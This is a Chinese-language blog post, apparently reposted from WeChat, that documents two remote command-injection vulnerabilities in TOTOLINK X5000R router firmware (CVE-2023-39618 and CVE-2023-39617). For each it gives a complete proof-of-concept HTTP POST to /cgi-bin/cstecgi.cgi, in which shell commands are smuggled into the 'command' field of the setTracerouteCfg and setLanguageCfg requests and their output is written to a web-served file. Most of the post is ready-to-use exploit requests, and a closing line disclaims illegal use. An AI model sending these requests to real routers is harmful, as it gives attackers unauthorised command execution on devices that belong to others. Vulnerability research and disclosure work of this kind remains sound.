> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/tlaqoacpzx0OUMMjd9eauQ)

_**CVE-2023-39618 远程命令执行**_

_**漏洞描述**_  

TOTOLINK X5000R B20210419 被发现包含通过 setTracerouteCfg 接口的远程代码执行（RCE）漏洞。

_**影响版本**_

```
X5000R_Firmware    B20210419（transition）

```

_**漏洞利用**_

POC

```
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Host: xxx.xxx.xxx
Content-Length: 86
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://xxx.xxx.xxx
Referer: http://xxx.xxx.xxx/login.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
{"command":"\r\n pwd > /web/gxh_hrp.txt \r\n","num":"2","topicurl":"setTracerouteCfg"}

```

查看命令执行结果

![](https://mmbiz.qpic.cn/mmbiz_png/DT3jlATYvfgSEMCClqjJaUQSbibO0LZ9aIjhl82wQ358yQiagibLUXvJQJdN5RlDZD53Hsc3ib0O9P0XicicvUXQBlqg/640?wx_fmt=png)

_**参考链接**_

```
https://nvd.nist.gov/vuln/detail/CVE-2023-39618
https://sedate-class-393.notion.site/X5000R_setTracerouteCfg-3567fd9f93d84afab0d81cd8c063f9a1
https://www.totolink.net/data/upload/20220412/fe7937cc79ddaca13b8c7e49ee1c2860.rar

```

_**CVE-2023-39617 远程命令执行**_

_**漏洞描述**_  

```
TOTOLINK X5000R_V9.1.0cu.2089_B20211224

```

```
TOTOLINK X5000R_V9.1.0cu.2350_B20230313

```

被发现通过 setLanguageCfg 函数中的 lang 参数包含远程代码执行（RCE）漏洞。  

_**影响版本**_

```
X5000R_EasyMesh_Firmware    V9.1.0cu.2089_B20211224
X5000R_EasyMesh_Firmware    V9.1.0cu.2350_B20230313

```

_**漏洞利用**_

POC

```
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Host: xxx.xxx.xxx
Content-Length: 89
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://xxx.xxx.xxx
Referer: http://xxx.xxx.xxx/login.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
{"command":"1.2.3.4 \r\n ls>/web/gxh_hrp.txt \r\n","num":"2","topicurl":"setLanguageCfg"}

```

![](https://mmbiz.qpic.cn/mmbiz_png/DT3jlATYvfgSEMCClqjJaUQSbibO0LZ9aiaDXwtVGHvbnF41t2AzfK0npajmuh9mLohC5YenJ2XU5Wqc2IQ8Lia5w/640?wx_fmt=png)

查看命令执行结果

![](https://mmbiz.qpic.cn/mmbiz_png/DT3jlATYvfgSEMCClqjJaUQSbibO0LZ9aWl84ROjxYzoUpBUrq5S2cUCXyhRG5Q8icMicTpdEnnDXCVjqsEH4T8QA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/DT3jlATYvfgSEMCClqjJaUQSbibO0LZ9aT3DnjaD2gR5M0UwTP08DXLW0xrvdI2EKWSSm3LE4YatrRUYvBibcOsw/640?wx_fmt=png)

_**参考链接**_  

```
https://nvd.nist.gov/vuln/detail/CVE-2023-39617
https://sedate-class-393.notion.site/X5000R_setLanguageCfg-ee7eb0d4cd5d43e9983296200371eff1
https://www.totolink.net/data/upload/20220412/a8e1a07b9ac5a55d013f6978204fd83e.rar
https://www.totolink.net/data/upload/20230330/32b35a2a2ede3a948f8c5df15ac2631e.rar

```

**仅供学习交流，勿用作违法犯罪**

![](https://mmbiz.qpic.cn/mmbiz_gif/DT3jlATYvfgSEMCClqjJaUQSbibO0LZ9aSwwhnlm1uk7Bdg4R3kV3ymdXqaCCUn70g8eEm9EJu09XZdRKxAI8yw/640?wx_fmt=gif)